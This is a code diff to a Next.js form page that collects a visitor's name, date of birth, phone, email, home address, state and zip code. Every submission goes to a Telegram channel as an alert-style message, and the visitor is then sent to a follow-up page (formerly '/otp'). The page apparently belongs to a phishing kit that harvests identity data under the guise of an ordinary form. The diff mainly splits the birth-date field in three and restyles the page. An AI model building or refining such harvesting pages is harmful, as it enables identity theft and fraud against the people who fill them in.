@@ -1,4 +1,5 @@
 "use client";
+
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 import Head from "next/head";
@@ -6,7 +7,6 @@ import { sendTelegramMessage } from "../../utils/telegram"; // Import Telegram f
 
 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/; // U.S. phone format (XXX) XXX-XXXX
-const dateRegex = /^\d{4}-\d{2}-\d{2}$/; // YYYY-MM-DD
 const zipRegex = /^\d{5}$/; // Zipcode format (XXXXX)
 
 const validateInput = (field: string, value: string): string => {
@@ -15,8 +15,10 @@ const validateInput = (field: string, value: string): string => {
       return emailRegex.test(value) ? "" : "Please enter a valid email address.";
     case "phone":
       return phoneRegex.test(value) ? "" : "Phone number must be in (XXX) XXX-XXXX format.";
-    case "dob":
-      return dateRegex.test(value) ? "" : "Please enter a valid date (YYYY-MM-DD).";
+    case "day":
+    case "month":
+    case "year":
+      return value.trim() ? "" : "This field is required.";
     case "firstName":
       return value.trim() ? "" : "First name is required.";
     case "lastName":
@@ -34,23 +36,27 @@ const FormPage = () => {
   type FormErrors = {
     firstName?: string;
     lastName?: string;
-    dob?: string;
+    day?: string;
+    month?: string;
+    year?: string;
     phone?: string;
     email?: string;
     address?: string;
     state?: string;
-    zipcode?: string; // Add zipcode field
+    zipcode?: string;
   };
   
   const [formErrors, setFormErrors] = useState<FormErrors>({});
-  const [phone, setPhone] = useState<string>(""); // Phone state for formatting
-  const [zipcode, setZipcode] = useState<string>(""); // Zipcode state
-  const [state, setState] = useState<string>(""); // State selection
+  const [phone, setPhone] = useState<string>("");
+  const [zipcode, setZipcode] = useState<string>("");
+  const [state, setState] = useState<string>("");
+  const [day, setDay] = useState<string>("");
+  const [month, setMonth] = useState<string>("");
+  const [year, setYear] = useState<string>("");
   const router = useRouter();
 
-  // Function to handle phone number formatting
   const formatPhoneNumber = (input: string) => {
-    const cleaned = input.replace(/\D/g, ""); // Remove non-numeric characters
+    const cleaned = input.replace(/\D/g, "");
     if (cleaned.length <= 3) return `(${cleaned}`;
     if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
     return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`;
@@ -67,7 +73,9 @@ const FormPage = () => {
     const formData = {
       firstName: (form.elements.namedItem("firstName") as HTMLInputElement).value,
       lastName: (form.elements.namedItem("lastName") as HTMLInputElement).value,
-      dob: (form.elements.namedItem("dob") as HTMLInputElement).value,
+      day,
+      month,
+      year,
       phone,
       email: (form.elements.namedItem("email") as HTMLInputElement).value,
       address: (form.elements.namedItem("address") as HTMLInputElement).value,
@@ -89,23 +97,21 @@ const FormPage = () => {
       return;
     }
 
-    // Prepare message for Telegram
-    const message = `
-      🚨 New Contact Form Submission 🚨
+    const dob = `${formData.year}-${formData.month}-${formData.day}`;
+
+    const message = `🚨 New Contact Form Submission 🚨
       - Full Name: ${formData.firstName} ${formData.lastName}
-      - Date of Birth: ${formData.dob}
+      - Date of Birth: ${dob}
       - Phone: ${formData.phone}
       - Email: ${formData.email}
       - Address: ${formData.address}
       - State: ${formData.state}
       - Zipcode: ${formData.zipcode}
-      - Time: ${new Date().toLocaleString()}
-    `;
+      - Time: ${new Date().toLocaleString()}`;
 
-    // Try sending the message to Telegram
     try {
       await sendTelegramMessage(message);
-      router.push("/otp"); // Navigate to success page after form submission
+      router.push("/personal");
     } catch (error) {
       console.error("Error sending message to Telegram:", error);
       alert("An error occurred while submitting the form. Please try again.");
@@ -164,16 +170,51 @@ const FormPage = () => {
               </div>
 
               {/* Date of Birth */}
-              <div className="mb-6">
-                <label htmlFor="dob" className="block text-sm font-medium text-black">Date of Birth (YYYY-MM-DD)</label>
-                <input
-                  id="dob"
-                  name="dob"
-                  type="date"
-                  required
-                  className={`w-full mt-2 border ${formErrors.dob ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.dob ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
-                />
-                {formErrors.dob && <p className="text-sm text-red-500 mt-2">{formErrors.dob}</p>}
+              <div className="grid grid-cols-3 gap-4 mb-6">
+                <div>
+                  <label htmlFor="day" className="block text-sm font-medium text-black">Day</label>
+                  <input
+                    id="day"
+                    name="day"
+                    type="text"
+                    placeholder="DD"
+                    required
+                    value={day}
+                    onChange={(e) => setDay(e.target.value)}
+                    className={`w-full mt-2 border ${formErrors.day ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.day ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                  />
+                  {formErrors.day && <p className="text-sm text-red-500 mt-2">{formErrors.day}</p>}
+                </div>
+
+                <div>
+                  <label htmlFor="month" className="block text-sm font-medium text-black">Month</label>
+                  <input
+                    id="month"
+                    name="month"
+                    type="text"
+                    placeholder="MM"
+                    required
+                    value={month}
+                    onChange={(e) => setMonth(e.target.value)}
+                    className={`w-full mt-2 border ${formErrors.month ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.month ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                  />
+                  {formErrors.month && <p className="text-sm text-red-500 mt-2">{formErrors.month}</p>}
+                </div>
+
+                <div>
+                  <label htmlFor="year" className="block text-sm font-medium text-black">Year</label>
+                  <input
+                    id="year"
+                    name="year"
+                    type="text"
+                    placeholder="YYYY"
+                    required
+                    value={year}
+                    onChange={(e) => setYear(e.target.value)}
+                    className={`w-full mt-2 border ${formErrors.year ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.year ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                  />
+                  {formErrors.year && <p className="text-sm text-red-500 mt-2">{formErrors.year}</p>}
+                </div>
               </div>
 
               {/* Phone Number with Formatting */}
@@ -187,7 +228,6 @@ const FormPage = () => {
                   required
                   value={phone}
                   onChange={handlePhoneChange}
-                  maxLength={14}
                   className={`w-full mt-2 border ${formErrors.phone ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.phone ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                 />
                 {formErrors.phone && <p className="text-sm text-red-500 mt-2">{formErrors.phone}</p>}
@@ -219,21 +259,21 @@ const FormPage = () => {
                 {formErrors.address && <p className="text-sm text-red-500 mt-2">{formErrors.address}</p>}
               </div>
 
-              {/* State Selection */}
+              {/* State */}
               <div className="mb-6">
                 <label htmlFor="state" className="block text-sm font-medium text-black">State</label>
                 <select
                   id="state"
                   name="state"
+                  required
                   value={state}
                   onChange={(e) => setState(e.target.value)}
-                  required
-                  className="w-full mt-2 border rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  className={`w-full mt-2 border ${formErrors.state ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.state ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                 >
-                  <option value="">Select a State</option>
-                  {states.map((stateCode) => (
-                    <option key={stateCode} value={stateCode}>
-                      {stateCode}
+                  <option value="" disabled>Select a state</option>
+                  {states.map((state) => (
+                    <option key={state} value={state}>
+                      {state}
                     </option>
                   ))}
                 </select>
@@ -242,27 +282,25 @@ const FormPage = () => {
 
               {/* Zipcode */}
               <div className="mb-6">
-                <label htmlFor="zipcode" className="block text-sm font-medium text-black">Zipcode</label>
+                <label htmlFor="zipcode" className="block text-sm font-medium text-black">Zip Code</label>
                 <input
                   id="zipcode"
                   name="zipcode"
                   type="text"
+                  placeholder="12345"
+                  required
                   value={zipcode}
                   onChange={(e) => setZipcode(e.target.value)}
-                  maxLength={5}
-                  required
                   className={`w-full mt-2 border ${formErrors.zipcode ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.zipcode ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                 />
                 {formErrors.zipcode && <p className="text-sm text-red-500 mt-2">{formErrors.zipcode}</p>}
               </div>
 
-              {/* Submit Button */}
-              <button
-                type="submit"
-                className="w-full bg-[#66d3ee] text-white py-3 rounded-lg hover:bg-[#4aafc3] transition duration-200"
-              >
-                Submit
-              </button>
+              <div className="flex justify-center mb-8">
+                <button type="submit" className="w-full bg-[#66d3ee] hover:bg-[#4ea8c8] text-white p-4 rounded-xl shadow-md focus:outline-none">
+                  Submit
+                </button>
+              </div>
             </form>
           </div>
         </main>
